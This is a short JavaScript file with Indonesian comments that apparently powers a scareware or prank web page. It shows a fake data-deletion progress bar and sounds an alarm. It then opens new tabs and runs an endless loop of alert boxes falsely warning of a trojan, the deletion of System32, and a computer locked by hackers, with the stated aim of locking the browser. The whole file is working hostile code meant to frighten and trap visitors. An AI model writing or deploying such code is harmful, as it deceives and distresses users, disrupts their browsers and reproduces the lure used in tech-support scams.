window.onload = function() {
    // Memulai audio alarm saat user klik pertama kali di layar
    document.body.addEventListener('click', () => {
        document.getElementById('alarm').play();
    }, { once: true });

    // Simulasi Progress Bar Hapus Data
    let percent = document.getElementById('percent');
    let progress = document.querySelector('.progress');
    let count = 0;

    let interval = setInterval(() => {
        if (count < 100) {
            count++;
            percent.innerText = count;
            progress.style.width = count + '%';
        } else {
            clearInterval(interval);
            triggerBrutalPopup(); // Pemicu popup tanpa henti
        }
    }, 50); // Kecepatan loading (50ms per persen)
};

// Fungsi Loop Popup yang Mengunci Browser
function triggerBrutalPopup() {
    // Membuka tab baru secara paksa (opsional, sering diblokir browser modern)
    for (let i = 0; i < 3; i++) {
        window.open(window.location.href, '_blank');
    }

    // Loop Alert tanpa henti yang membuat tab tidak bisa di-close dengan mudah
    while (true) {
        alert("Peringatan: VIRUS TROJAN_HORSE_X DETECTED!");
        alert("Menghapus System32...");
        alert("Jangan coba-coba menutup browser ini!");
        alert("Akses ke komputer Anda telah dikunci oleh peretas.");
    }
}
